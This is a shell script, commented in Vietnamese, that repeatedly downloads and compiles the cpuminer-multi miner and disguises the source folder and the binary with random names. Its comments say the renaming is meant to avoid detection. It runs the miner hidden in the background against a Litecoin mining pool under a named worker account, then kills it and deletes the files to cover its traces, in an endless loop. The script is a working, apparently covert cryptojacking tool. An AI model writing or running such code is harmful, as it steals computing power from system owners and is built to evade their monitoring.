#!/bin/sh

# Tạo một tên tệp ngẫu nhiên để khó phát hiện hơn
generate_random_name() {
  tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 12
}

# Vòng lặp vô hạn để script chạy liên tục
while true; do
  # Tải file
  
  git clone https://github.com/tpruvot/cpuminer-multi.git
  # Giải nén file
  random_name=$(generate_random_name)
  mv cpuminer-multi "$random_name"
  cd "$random_name"
  
  ./autogen.sh
  CFLAGS="-march=native" ./configure
  make

  ./build.sh

  # Đổi tên file để khó phát hiện hơn
  random_name_sh=$(generate_random_name)
  mv cpuminer "$random_name_sh"

  # Chạy chương trình với tên đã đổi, ẩn danh và chạy ngầm trong 5 phút
  nohup ./"$random_name_sh" -a scrypt -o stratum+tcp://ltc.poolbinance.com:3333 -u dienvn.001 -p 123456 -t 3 >/dev/null 2>&1 &
  miner_pid=$!

  # Ngủ trong 5 phút
  sleep 300

  # Dừng chương trình
  kill $miner_pid

  # Xóa các file đã tải và giải nén
  cd ..
  rm -rf "$random_name"
  rm -rf "$random_name_sh"

  # Nghỉ 3 phút trước khi lặp lại
  sleep 180
done
